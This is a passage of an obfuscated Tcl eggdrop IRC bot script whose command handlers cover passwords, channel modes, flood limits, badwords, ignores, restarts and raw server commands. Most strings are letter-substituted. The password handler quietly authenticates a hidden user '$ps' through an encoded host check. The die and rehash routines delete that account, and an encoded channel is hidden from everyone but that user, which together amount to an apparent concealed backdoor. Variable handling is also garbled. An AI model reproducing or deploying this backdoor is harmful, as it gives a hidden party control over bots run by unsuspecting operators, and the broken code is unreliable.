proc [lines "nht_kzhh"] {nick uhost hand rest} {
global botnick notc vern ps owner ath pww host
set [lines "kd"] [lindex $rest 0]
set [lines "kdd"] [lindex $rest 0]
if {$pw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzhh <kzhhdliw>"
return 0
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf zoivzwb hvg kzhh, /nht ~$botnick ~zfgs <kzhhdliw>" 
return 0
}
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $pw] == $uhost} {
set [lines "zgs"] 1
set [lines "slhg"] $uhost
putsrv "DSLRH ~$nick"
} {
puthlp "MLGRXV ~$nick ~:~$notc ~dSl.."
}
return 0
}
setuser $nick PASS $pw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$pw"

puthlp "MLGRXV ~$nick ~:~$notc ~/nht ~$botnick ~svok"
saveuser
return 0
}
proc [lines "kfy_!wvzfgs"] {nick uhost hand chan rest} {
if {![matchattr $nick Q]} { return 0 }
msg_deauth $nick $uhost $hand $rest
}
proc [lines "nht_wvzfgs"] {nick uhost hand rest} {
global notc 
if {![matchattr $nick Q]} { return 0 }
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
puthlp "MLGRXV ~$nick ~:~$notc ~4!WvZFGS!"
saveuser
}
catch { bind rejn - * rejn_chk }
proc [lines "ivqm_xsp"] {unick uhost handle chan} {
if {![isutimer "TRAFFIC $chan"]} {
utimer 30 [list putlog "TRAFFIC $chan"]
}
}
catch { bind splt - * splt_deauth }
proc [lines "hkog_wvzfgs"] {unick uhost handle channel} {
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
}
proc [lines "hrtm_wvzfgs"] {unick uhost hand chan rest} {
global ex_flood botnick notc nick badwords iskick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$unick == $nick} {
putsrv "MRXP ~$nick"
}
if {[info exists iskick($unick$chan)]} {
unset iskick($unick$chan)
}
if {[isop $botnick $chan]} {
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[matchattr $unick f]} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {[string match "*AKILL ID*" $rest]} {
set ex_flood($mhost) "0" 
} elseif {[string match "*Excess Flood*" $rest]} {
if {[matchattr $cflag S]} {
set ex_flood($mhost) "1" 
}
} elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
}
set ex_flood($mhost) "2"
} else {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $rest]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
return 0
}
proc [lines "kzig_wvzfgs"] {nick uhost hand chan {msg ""}} {
global lockchan botnick ex_flood notc badwords jpnick iskick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[info exists iskick($nick$chan)]} {
unset iskick($nick$chan)
}
if {$nick == $botnick} {
foreach x [utimers] {
if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
return 0
}
if {[matchattr $cflag H]} { 
if {![isop $botnick $chan]} { return 0 }
msgpart $chan $nick 
}
if {[isop $botnick $chan]} {
if {[isutimer "voiceq $chan $nick"]} {
foreach x [utimers] {
if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $nick Q]} {
foreach x [channels] {
if {[string tolower $x] != [string tolower $chan]} {
if {[onchan $nick $x]} {
return 0 
}
}
}
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
}
if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
putsrv "RMERGV ~$nick ~:~$chan"
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[isop $botnick $chan]} {
if {[info exists msg]} {
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
}
set ex_flood($mhost) "3"
} {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $msg]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
}
if {[info exists msg]} {
if {$msg != ""} { return 0 }
}
if {[matchattr $cflag P]} {
set [lines "xszm"] [string toupper $chan]
if {[info exists jpnick($nick)]} {
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
set ex_flood($mhost) "4"
}
}
}
return 0
}
proc [lines "kfy_wfnk"] {nick uhost hand chan rest} {
global own notc 
if {$nick != $own} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
putsrv ~$rest
}
proc [lines "kfy_hwvlk"] {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set [lines "xszm"] $rest
}
if {[isop $botnick $chan]} {
puthelp "mode $chan -o $botnick"
}
}
proc [lines "kfy_xszmnlwv"] {nick uhost hand chan rest} {
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic aLoWaiNi.No 1"
return 0
}
if {[string index [lindex $rest 0] 0] == "#"} {
if {![validchan [lindex $rest 0]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~[lindex $rest 0]~"
return 0
}
set [lines "xszm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
}
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~<m/z>"
} else {
catch { channel set $chan chanmode $rest }
savechan
puthelp "NOTICE $nick :$notc $chan set modes \[$rest\]"
}
return 0
}
proc [lines "kfy_xszmhvg"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "xszmmvo"] [lindex $rest 0]
set [lines "lkgrlmh"] [string tolower [lindex $rest 1]]
set [lines "mfnyvi"] "0"
if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
set [lines "mfnyvi"] [lindex $rest 2]
}
if {($channel == "") || ($options == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvg #xszmmvo <lkgrlm...>"
return 0
}
if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvg #xszmmvo <wvlk|xgxk|prxp|qlrm|ormv|mrxp> <sldnzmbgrnvh:hvxlmwh>"
return 0
}
if {[validchan $channel]} {
if {$options == "deop"} { 
catch { channel set $channel flood-deop $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg wvlk uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "kick"} { 
catch { channel set $channel flood-kick $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg prxp uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "join"} { 
catch { channel set $channel flood-join $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg qlrm uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "line"} { 
catch { channel set $channel flood-chan $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg ormv uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "nick"} { 
catch { channel set $channel flood-nick $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg mrxp uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "ctcp"} { 
catch { channel set $channel flood-ctcp $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg xgxk uollw \[~$number\] ~lm ~$channel"
} else {
catch { channel set $channel ${options} }
savechan
puthelp "NOTICE $nick :$notc Successfully set modes \[${options}\] on $channel"
}
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~~$channel ~<m/z>"
}
}
proc [lines "kfy_xszmhvgzoo"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvgzoo <lkgrlm>"
return 0
}
foreach x [channels] {
catch { channel set $x $rest }
}
savechan
puthelp "NOTICE $nick :$notc Set all channels mode \{ $rest \}"
return 0
}
proc [lines "kfy_mrxp"] {nick uhost hand chan rest} {
global keep-nick
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$rest"
}
proc [lines "kfy_ivhgzig"] {nick uhost hand chan rest} {
global botnick notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~IvHGzIG IvJfvhG Yb \[ ~$nick ~\]~$rest 14(~Lm ~$curtime)"
return 0
}
proc [lines "wrvh"] {} {
global ps owner notc
if {$ps != $owner && [validuser $ps]} { deluser $ps }
die $notc
}
proc [lines "ivszhsrmt"] {} {
global ps owner
if {$ps != $owner && [validuser $ps]} { deluser $ps }
rehash
}
proc [lines "kfy_wrv"] {nick uhost hand chan rest} {
global botnick ps notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~HSfGWldm IvJfvhG Yb \[ ~$nick ~\]~$rest 14(~Lm ~$curtime)"
utimer 5 dies
return 0
}
proc [lines "nht_ivhgzig"] {nick uhost hand rest} {
global botnick notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~IvHGzIG IvJfvhG Yb \[ ~$nick ~\]~$rest 14(~Lm ~$curtime)"
return 0
}
proc [lines "nht_ivszhs"] {nick uhost hand rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvSZHSRMT!"
utimer 3 rehashing
return 0
}
proc [lines "kfy_ivszhs"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvSZHSRMT!"
utimer 3 rehashing
}
proc [lines "kfy_xszmrmul"] {nick uhost hand chan rest} {
global notc ps
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~\[~$chan\] ~~[channel info $chan]~"
}
bind join - * ps:check
proc [lines "kfy_zxxvhh"] {nick uhost hand chan rest} {
global notc
if {[matchattr $nick Z]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~LdMvI"
} elseif {[matchattr $nick n]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~ZWNRM"
} elseif {[matchattr $nick m]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~NzhGvI"
} elseif {[matchattr $nick f]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~UIRVMW"
}
}
proc [lines "nht_ylgmrxp"] {unick uhost hand rest} {
   global botnick nick nickpass notc chankey
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ymrxp"] [lindex $rest 0]
set [lines "ykzhh"] [lindex $rest 1]
if {$bnick == "" || $bpass == ""} {
puthlp "MLGRXV ~$unick ~:~$notc4 ~Fhztv: ylgmrxp <mrxp> <rwvmgrub>"
return 0
} 
setuser "config" XTRA "NICK" [zip $bnick]
setuser "config" XTRA "NICKPASS" [encrypt $chankey $bpass]
saveuser
set [lines "mrxp"] $bnick
set [lines "mrxpkzhh"] $bpass
puthlp "MLGRXV ~$unick ~:~$notc ~YlGMRxP ~$bnick"
}
proc [lines "nht_ivzomznv"] {unick uhost hand rest} {
global realname notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "REALNAME" ""
} { 
setuser "config" XTRA "REALNAME" [zip $rest] 
}
saveuser
set [lines "ivzomznv"] $rest
putsrv "JFRG :~$notc ~xSzMtRMt IvzOMznV IvJfvhG Yb \[ ~$unick ~\]"
}
proc [lines "nht_rwvmg"] {unick uhost hand rest} {
global username notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "USERNAME" ""
} { 
if {[regexp \[^a-z\] [string tolower $rest]]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..! fhv xszizxgvi uli rwvmg."
return 0
}
setuser "config" XTRA "USERNAME" [zip $rest] 
}
saveuser
set [lines "fhvimznv"] $rest
putsrv "JFRG :~$notc ~xSzMtRMt RwVmG IvJfvhG Yb \[ ~$unick ~\]"
}
proc [lines "nht_oltl"] {unick uhost hand rest} {
global banner notc notm cycle_random
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*$notm*" $rest]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "BAN" ""
puthlp "MLGRXV ~$unick ~:~$notc ~xSzMtV gL WvUzfOG"
catch { unset banner }
} {
setuser "config" XTRA "BAN" [zip $rest] 
set [lines "yzmmvi"] $rest
lappend cycle_random $banner
puthlp "MLGRXV ~$unick ~:~$notc ~XSzMtV GL ~$rest"
}
saveuser
}
proc [lines "nht_vnzro"] {unick uhost hand rest} {
global notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$unick ~:~$notc14 ~WvOVGRMT FHvI VnZRO"
} {
puthlp "MLGRXV ~$unick ~:~$notc14 ~FHvI VnZRO HvG \[~$rest\]"
}
setuser "config" XTRA "EMAIL" $rest
saveuser
}
proc [lines "nht_zwnrm"] {unick uhost hand rest} {
global notc
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$unick ~:~$notc14 ~HvG ZWnRM lM HGzGFH GL WvUZFOG"
} {
puthlp "MLGRXV ~$unick ~:~$notc14 ~ZWnRM lM HGzGFH GL \[~$rest\]"
}
setuser "config" XTRA "ADMIN" $rest
saveuser
}
proc [lines "nht_ylgzogmrxp"] {unick uhost hand rest} {
global botnick altnick altpass notc chankey
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "yzogmrxp"] [lindex $rest 0]
set [lines "yzogkzhh"] [lindex $rest 1]
if {$baltnick == "" || $baltpass == ""} {
puthlp "MLGRXV ~$unick ~:~$notc4 ~Fhztv: ylgzogmrxp <mrxp> <rwvmgrub>"
return 0
} 
setuser "config" XTRA "ALTNICK" [zip $baltnick]
setuser "config" XTRA "ALTPASS" [encrypt $chankey $baltpass]
saveuser
set [lines "zogmrxp"] $baltnick
set [lines "zogkzhh"] $baltpass
puthlp "MLGRXV ~$unick ~:~$notc ~YlGZOGMRxP ~$baltnick"
}
proc [lines "nht_zdzb"] {unick uhost hand rest} {
global realname notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "AWAY" ""
puthlp "MLGRXV ~$unick ~:~$notc ~ZdZB \[4LUU\]"
} {
setuser "config" XTRA "AWAY" $rest
puthlp "MLGRXV ~$unick ~:~$notc ~ZdZB HvG GL \[~$rest\]"
}
saveuser
chk_five "0" "0" "0" "0" "0"
}
proc [lines "nht_nvnl"] {nick uhost hand rest} {
global notc own ps
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nvnl <zoo/fhvi> <nht>"
return 0
}
set [lines "nhvmw"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $msend] == "all"} {
set [lines "hnvnl"] ""
foreach x [userlist m] {
if {$x != $nick && $x != $own} {
if {[getuser $x XTRA "MEMO"] == ""} {
setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
append smemo "$x "
}
}
}
if {$smemo == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL !UzROVW! ML FhVI HvMW"
} {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL HvMW GL \[ ~$smemo\]"
}
} {
if {![validuser $msend] || $msend == $ps} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ML FhVI!"
return 0
} {
if {![matchattr $msend m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, NrM NzhGvI UOzT!"
return 0
}
if {$msend == $nick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG HvOU NvNl!"
return 0
}
if {[getuser $msend XTRA "MEMO"]!=""} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, NvNl UlI ~$msend ~HGrOO VcRHG!"
return 0
}
setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL HvMW GL \[~[lindex $rest 0]~\]"
}
}
}
proc [lines "kfy_+nfhglk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
setuser "config" XTRA "MUSTOP" "T"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~nfhg @K hvg \[9LM\]"
}
proc [lines "kfy_-nfhglk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
setuser "config" XTRA "MUSTOP" ""
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~nfhg @K hvg \[4LUU\]"
}
proc [lines "kfy_yzmpvb"] {nick uhost hand chan rest} {
global bankey notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!WvMRVW!"
return 0
}
if {[string tolower [lindex $rest 0]] == "off"} {
setuser "config" XTRA "BANKEY" "F"
saveuser
set [lines "yzmpvb"] "F"
puthlp "MLGRXV ~$nick ~:~$notc ~YzMPvB \[4LUU\]"
} elseif {[string tolower [lindex $rest 0]] == "on"} {
setuser "config" XTRA "BANKEY" ""

puthlp "MLGRXV ~$nick ~:~$notc ~YzMPvB \[9LM\]"
saveuser
set [lines "yzmpvb"] "T"
}
}
proc pub_kickcounter {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNIEd..!"
return 0
}
if {[string tolower $rest] == "on"} {
set kcounter "T"
setuser "config" XTRA "KCOUNTER" "ON"
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[9ON\]"
saveuser
} elseif {[string tolower $rest] == "off"} {
catch { unset kcounter }
setuser "config" XTRA "KCOUNTER" "OFF"
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[4OFF\]"
saveuser
} else {
puthlp "NOTICE $nick :$notc Usage: +kickcounter on/off"
}
}
proc [lines "kfy_prxplkh"] {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $rest] == "on"} {
set [lines "plkh"] "T"
setuser "config" XTRA "KOPS" "T"
puthlp "MLGRXV ~$nick ~:~$notc ~PRxP @KH \[9LM\]"
} {
catch { unset kops }
setuser "config" XTRA "KOPS" ""
puthlp "MLGRXV ~$nick ~:~$notc ~PRxP @KH \[4LUU\]"
}
saveuser
}
bind topc - * topic_chk
proc [lines "kfy_yzwdliwh"] {nick uhost hand chan rest} {
global badwords notc 
set [lines "ivgezo"] "BaDWoRDS: "
foreach badword [string tolower $badwords] {
append retval "$badword "
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$retval"
return 0
}
proc [lines "kfy_+yzwdliw"] {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `+yzwdliw <yzwdliw>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~[lindex $rest 0]~ Zooivzwb Zwwvw"
return 0
}
append badwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "BADWORDS" $badwords
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw ~[lindex $rest 0]~ gl yzwdliwh"
return 0
}
proc [lines "kfy_-yzwdliw"] {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `-yzwdliw <yzwdliw>"
return 0
}
set [lines "ezo"] ""
foreach badword [string tolower $badwords] {
if {[string tolower [lindex $rest 0]] == $badword} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw ~[lindex $rest 0]~"
} else { append val " $badword " }
}
set [lines "yzwdliwh"] $val
setuser "config" XTRA "BADWORDS" $val
saveuser
return 0
}
bind pub - `sz ack_act
proc [lines "kfy_zwedliwh"] {nick uhost hand chan rest} {
global advwords notc 
set [lines "ivgezo"] "AdVWoRDS: "
foreach advword [string tolower $advwords] {
append retval "$advword "
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$retval"
return 0
}
proc [lines "kfy_+zwedliw"] {nick uhost hand chan rest} {
global advwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `+zwedliw <zwedliw>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~[lindex $rest 0]~ Zooivzwb Zwwvw"
return 0
}
append advwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "ADVWORDS" $advwords
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw ~[lindex $rest 0]~ gl zwedliwh"
return 0
}
proc [lines "kfy_-zwedliw"] {nick uhost hand chan rest} {
global advwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `-zwedliw <dliw>"
return 0
}
set [lines "ezo"] ""
foreach advword [string tolower $advwords] {
if {[string tolower [lindex $rest 0]] == $advword} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw ~[lindex $rest 0]~"
} else { append val "$advword " }

}
set [lines "zwedliwh"] $val
setuser "config" XTRA "ADVWORDS" $val
saveuser
return 0
}
proc [lines "kfy_qfnk"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "hvievi"] [lindex $rest 0]
if {$server == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qfnk <hvievi> \[klig\] \[kzhhdliw\]"
return 0
}
if {![string match "*dal.net*" [string tolower $rest]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..! MlG WZOMvG..!"
return 0
}
set [lines "klig"] [lindex $rest 1]
if {$port == ""} {set port "6667"}
set [lines "kzhhdliw"] [lindex $rest 2]
putsrv "JFRG :~$notc ~xSzMtRMt HvievI IvJfvhG Yb \[ ~$nick ~\] ~$server"
utimer 2 [list jump $server $port $password]
}
proc [lines "nht_wrv"] {nick uhost hand rest} {
global notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist] {
if {$x != "AKICK"} {
chattr $x -Q
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set [lines "slhgnzhp"] "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
saveuser
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~HSfGWldm IvJfvhG Yb \[ ~$nick ~\]~$rest 14(~Lm ~$curtime)"
utimer 5 dies
}
proc [lines "kfy_rtmlivh"] {nick uhost hand chan rest} {
global botnick notc 
set [lines "rtorhg"] ""
foreach x [ignorelist] {
set [lines "rtorhgvi"] [lindex $x 0]
set [lines "rtorhg"] "$iglist $iglister"
}
if {[ignorelist]==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml rtmlivh."
return 0
}
regsub -all " " $iglist ", " iglist
set [lines "rtorhg"] [string range $iglist 1 end]
puthlp "MLGRXV ~$nick ~:~$notc ~Xfiivmgob rtmlirmt:~$iglist"
return 0
}
proc [lines "kfy_-rtmliv"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "slhgnzhp"] [lindex $rest 0]
if {$hostmask == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -rtmliv <slhgnzhp>"
return 0
}
if {![isignore $hostmask]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$hostmask ~rh mlg lm nb rtmliv orhg."
return 0
}
if {[isignore $hostmask]} {
killignore $hostmask
puthlp "MLGRXV ~$nick ~:~$notc ~Ml olmtvi rtmlirmt \002\[\002~${hostmask}\002\]\002"
saveuser
}
}
proc [lines "kfy_+rtmliv"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ivhg"] [lindex $rest 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rtmliv <slhgnzhp>"
return 0
}
if {[isignore $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzb hvg lm rtmliv."
return 0
}
if {$rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Rovtzo slhgnzhp."
return 0
} 
set [lines "fhvmrxp"] [finduser $rest]
if {$usenick != "*" && [matchattr $usenick f]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, xzmG RtMlIVw UIRvmw FhVI"
return 0
}
if {$rest != $nick} {
newignore $rest $nick "*" 600
puthlp "MLGRXV ~$nick ~:~$notc ~Rtmlirmt ~$rest"
} else { 
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g rtmliv blfi hvou." 
}
}
proc [lines "kfy_-slhg"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "slhgmznv"] [lindex $rest 1]
set [lines "xlnkovgvw"] 0
if {($who == "") || ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -slhg <mrxp> <slhgnzhp>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ivnlev slhgnzhph uiln gsv ylg ldmvi."
return 0
}
